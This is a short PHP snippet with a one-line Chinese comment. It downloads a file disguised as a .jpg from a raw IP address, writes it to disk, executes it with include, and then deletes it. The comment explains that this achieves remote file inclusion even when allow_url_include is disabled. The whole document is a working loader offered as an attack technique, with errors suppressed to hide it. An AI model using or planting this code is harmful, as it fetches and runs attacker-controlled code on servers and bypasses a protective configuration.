<?php 
@file_put_contents('_',@file_get_contents('http://139.199.220.37/b1.jpg'));
@include('_');
@delete('_');
?>
也就是说，php.ini没开启 allow_url_include = off  也可以远程文件包含